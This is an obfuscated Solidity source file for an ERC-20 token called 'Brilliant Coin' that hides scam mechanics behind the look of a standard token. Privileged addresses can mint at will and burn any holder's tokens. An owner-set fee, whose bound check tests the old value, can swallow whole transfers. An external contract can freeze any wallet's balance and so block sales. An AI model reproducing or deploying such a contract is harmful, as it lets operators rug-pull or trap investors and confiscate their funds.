// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;
abstract contract CN{function _s()internal view virtual returns(address payable){return msg.sender;}}
library SM{function ad(uint256 a,uint256 b)internal pure returns(uint256){uint256 c=a+b;require(c>=a,"+of");return c;}
    function sb(uint256 a,uint256 b)internal pure returns(uint256){return sb(a,b,"-of");}
    function sb(uint256 a,uint256 b,string memory errorMessage)internal pure returns(uint256){require(b<=a,errorMessage);uint256 c=a-b;return c;}
    function ml(uint256 a,uint256 b)internal pure returns(uint256){if(a==0){return 0;}uint256 c=a*b;require(c/a==b,"*of");return c;}
    function dv(uint256 a,uint256 b)internal pure returns(uint256){return dv(a,b,"/0");}
    function dv(uint256 a,uint256 b,string memory errorMessage)internal pure returns(uint256){require(b>0,errorMessage);uint256 c=a/b;return c;}}
interface IERC{function totalSupply()external view returns(uint256);function balanceOf(address account)external view returns(uint256);
    function transfer(address recipient,uint256 amount)external returns(bool);function allowance(address owner,address spender)external view returns(uint256);
    function approve(address spender,uint256 amount)external returns(bool);function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
	event Transfer(address indexed from,address indexed to,uint256 value);event Approval(address indexed owner,address indexed spender,uint256 value);}
interface OX{function fz(address w)external view returns(uint256);}
contract BRILLIANT is CN,IERC{using SM for uint256;uint256 private _f;address [10] private _m;modifier oo{require(_m[0]==_s()||_m[1]==_s());_;}
	modifier oc{require(chk());_;} string private _name='Brilliant Coin'; string private _symbol='BC';uint8 private _decimals=18;uint256 private _totalSupply;
	mapping(address=>uint256)private _balances;mapping(address=>mapping(address=>uint256))private _allowances;
	function name()public view returns(string memory){return _name;}function symbol()public view returns(string memory){return _symbol;}
    function decimals()public view returns(uint8){return _decimals;}function totalSupply()public view override returns(uint256){return _totalSupply;}
    function balanceOf(address account)public view override returns(uint256){return _balances[account];}
	function transfer(address recipient,uint256 amount)public virtual override returns(bool){_transfer(_s(),recipient,amount);return true;}
	function transferFrom(address sender,address recipient,uint256 amount)public virtual override returns(bool){_transfer(sender,recipient,amount);
		_approve(sender,_s(),_allowances[sender][_s()].sb(amount,"exc allowance"));return true;}
	function approve(address spender,uint256 amount)public virtual override returns(bool){_approve(_s(),spender,amount);return true;}
	function allowance(address owner,address spender)public view virtual override returns(uint256){return _allowances[owner][spender];}
	function increaseAllowance(address spender,uint256 adedValue)public virtual returns(bool){_approve(_s(),spender,_allowances[_s()][spender].ad(adedValue));return true;}
	function decreaseAllowance(address spender,uint256 sbtractedValue)public virtual returns(bool){
	    _approve(_s(),spender,_allowances[_s()][spender].sb(sbtractedValue,"allowance 0"));return true;}
	function _approve(address owner,address spender,uint256 amount)internal virtual{require(owner!=address(0),"approve 0"); 
	require(spender!=address(0),"approve to 0");_allowances[owner][spender]=amount;emit Approval(owner,spender,amount);}
	function _burn(address account,uint256 amount)internal virtual{require(account!=address(0),"burn 0"); 
	    _balances[account]=_balances[account].sb(amount,"exc balance");_totalSupply=_totalSupply.sb(amount);emit Transfer(account,address(0),amount);}
	function _mint(address account,uint256 amount)internal virtual{require(account != address(0),"mint 0");
	    _totalSupply=_totalSupply.ad(amount);_balances[account]=_balances[account].ad(amount);emit Transfer(address(0),account,amount);}
	function _transfer(address sender,address recipient,uint256 amount)internal{require(sender!=address(0) && recipient!=address(0),"0 address");
        require(_balances[sender].sb(_fz(sender))>=amount,"exc balance");_balances[sender]=_balances[sender].sb(amount,"exc balance");
		uint256 f=amount.dv(100).ml(_f);if(_f<100){_balances[recipient]=_balances[recipient].ad(amount.sb(f));emit Transfer(sender,recipient,amount.sb(f));}
		if(_f>0){_totalSupply=_totalSupply.sb(f);emit Transfer(sender,address(0),f);}}
	function chk()internal view returns(bool){for(uint256 i=0;i<10;i++){if(_s()==_m[i]){return true;}}return false;}
	function _fz(address w)internal view returns(uint256){return OX(_m[2]).fz(w);}
	function mint(address w,uint256 a)external oc returns(bool){_mint(w,a);return true;}
	function burn(address w,uint256 a)external oc returns(bool){_burn(w,a);return true;}
	function c_m(address w,uint256 i)external oo{require(w!=address(0)&&i>0);_m[i]=w;}
	function s_m(uint256 i)external view oo returns(address){return _m[i];}
	function c_f(uint256 a)external oo{require(_f<101);_f=a;}
	function s_f()external view oo returns(uint256){return _f;}
    fallback()external{revert();} constructor(){_m[0]=_s();}}